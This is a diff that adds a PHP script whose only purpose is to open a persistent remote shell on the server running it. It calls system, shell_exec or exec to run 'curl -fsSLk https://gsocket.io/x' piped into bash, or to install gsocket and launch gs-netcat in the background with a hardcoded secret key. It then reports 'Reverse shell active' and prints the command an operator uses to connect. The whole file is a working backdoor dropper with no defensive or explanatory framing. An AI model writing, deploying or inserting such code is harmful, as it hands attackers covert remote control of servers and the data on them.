@@ -1,0 +1,56 @@
+<?php
+function executeCommand($command) {
+    $output = "";
+    $command = $command . " 2>&1";
+    
+    if (function_exists('system')) {
+        ob_start();
+        @system($command);
+        $output = ob_get_contents();
+        ob_end_clean();
+    } elseif (function_exists('shell_exec')) {
+        $output = @shell_exec($command);
+    } elseif (function_exists('exec')) {
+        @exec($command, $result);
+        $output = implode("\n", $result);
+    }
+    
+    return $output;
+}
+
+// YOUR SECRET KEY HERE
+$your_secret = "tootsiegs00"; // ← CHANGE THIS
+
+// Method 1: Using gsocket.io auto-script with your key
+$command = "GS_NOCERTCHECK=1 bash -c \"\$(curl -fsSLk https://gsocket.io/x)\" -s \"{$your_secret}\"";
+$result = executeCommand($command);
+
+// Method 2: Direct gsocket execution (if already installed)
+if (empty($result)) {
+    $command = "gs-netcat -s '{$your_secret}' -i 2>/dev/null &";
+    $result = executeCommand($command);
+}
+
+// Method 3: Install + execute with your key
+if (empty($result)) {
+    $install_cmd = "curl -fsSLk https://gsocket.io/install.sh | bash";
+    $exec_cmd = "gs-netcat -s '{$your_secret}' -i > /dev/null 2>&1 &";
+    
+    executeCommand($install_cmd);
+    $result = executeCommand($exec_cmd);
+}
+
+// Check for success
+if (preg_match('/gs-netcat\s+-s\s+["\']([^"\']+)["\']\s+-i/', $result, $matches)) {
+    echo "SUCCESS: Reverse shell active with key: {$matches[1]}\n";
+} else {
+    // Check if it's running in background
+    $check_process = executeCommand("ps aux | grep 'gs-netcat.*{$your_secret}'");
+    if (strpos($check_process, 'gs-netcat') !== false) {
+        echo "SUCCESS: gsocket running in background with key: {$your_secret}\n";
+        echo "Connect using: gs-netcat -s '{$your_secret}' -l -i\n";
+    } else {
+        echo "Failed to establish connection with key: {$your_secret}\n";
+    }
+}
+?>
